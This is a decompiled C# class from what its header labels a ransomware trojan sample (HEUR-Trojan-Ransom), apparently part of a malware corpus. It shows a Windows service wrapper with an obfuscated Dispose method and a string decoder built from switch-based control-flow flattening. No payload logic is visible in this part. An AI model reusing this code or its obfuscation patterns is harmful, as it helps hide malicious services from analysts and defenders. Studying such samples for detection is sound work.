// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႥႭ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႥႭ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴗ = new ႤႳ.Ⴄ();

    public ႥႭ() => this.Ⴅ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    internal static byte[] Ⴅ([In] string obj0) => ႳႼ.Ⴍ<string>(obj0, 'Ί', (short) 1008).Value;

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 4;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 2:
            goto label_4;
          case 3:
          case 5:
            num = this.Ⴗ.Ⴄ == null ? (int) ⴗ[18] - 53519 : (int) ⴍ[25];
            continue;
          case 6:
            goto label_5;
          default:
            num = !obj0 ? (int) ⴐ[521] - 136 : 5;
            continue;
        }
      }
label_4:
      this.Ⴗ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴅ()
    {
      this.Ⴗ.Ⴄ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႭႣ), 2L, 7, 1951761481), (short) 184, 'Ð');
    }

    static ႥႭ() => ႳႣ.Ⴅ();

    internal static string Ⴓ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] int obj1,
      [In] int obj2,
      [In] short obj3,
      [In] int obj4)
      where \u0021\u00210 : string
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴐ[109];
      IEnumerable<char> chars;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 8:
            chars = (IEnumerable<char>) null;
            goto case 10;
          case 1:
            num2 = 4;
            continue;
          case 2:
            num2 = num3 % 2 != 0 ? (int) ⴍ[11] : 3;
            continue;
          case 3:
            goto label_13;
          case 4:
            int num4;
            switch (((int) obj3 ^ obj4) - 75 ^ num1)
            {
              case 0:
                num4 = (int) ⴗ[17] - 57356;
                break;
              default:
                num4 = 8;
                break;
            }
            num2 = num4;
            continue;
          case 5:
            chars = (IEnumerable<char>) obj0.Substring(obj1, obj2);
            num2 = 6;
            continue;
          case 6:
            ++num1;
            int num5 = (int) obj3;
            int num6 = num5 * num5;
            num3 = (int) obj3 + num6;
            num2 = 2;
            continue;
          case 9:
          case 11:
            goto label_3;
          case 10:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႥႭ.Ⴓ);
            num2 = 9;
            continue;
        }
      }
label_13:
      return (string) chars;
    }
  }
}
